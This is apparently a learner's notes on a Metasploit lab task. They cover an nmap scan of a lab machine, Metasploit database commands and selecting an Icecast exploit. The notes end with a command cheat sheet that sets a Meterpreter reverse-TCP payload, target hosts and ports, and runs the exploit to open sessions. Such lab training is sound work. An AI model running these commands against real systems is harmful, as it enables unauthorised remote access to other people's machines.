# Task 5: Move the shell
```
Remember that database we set up? In this step, we're going to take a look at what we can use it for and exploit our victim while we're at it!

As you might have noticed, up until this point we haven't touched nmap in this room, let alone perform much recon on our victim box. That'll all change now as we'll take a swing at using nmap within Metasploit. Go ahead and deploy the box now, it may have up to a three-minute delay for starting up our target vulnerable service. 

*Note, Metasploit does support different types of port scans from within the auxiliary modules. Metasploit can also import other scans from nmap and Nessus just to name a few.  
```

2. What service does nmap identify running on port 135?
```db_nmap -sV 10.10.127.144 -p 135```
3. Let's go ahead and see what information we have collected in the database. Try typing the command '```hosts```' into the msfconsole now.
4. How about something else from the database, try the command '```services```' now.
5. One last thing, try the command '```vulns```' now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully.
6. Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type 'use' followed by a unique string found within only the target exploit. For example, try this out now with the following command 'use icecast'. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start

Dont have energy to copy stuff so here is my note:
```console
$msfconsole
$set PAYLOAD windows/meterpreter/reverse_tcp # set payload
$set LHOST <my ip> #
$search <name> # search for exploit
$use <num/name> # select the exploit
$set RHOST <target ip>
$set RPORT <target port>
$run -j # run the exploit
$expolit # run the exploit
$jobs # check all jobs run on the system
$sessions # list all sessions
```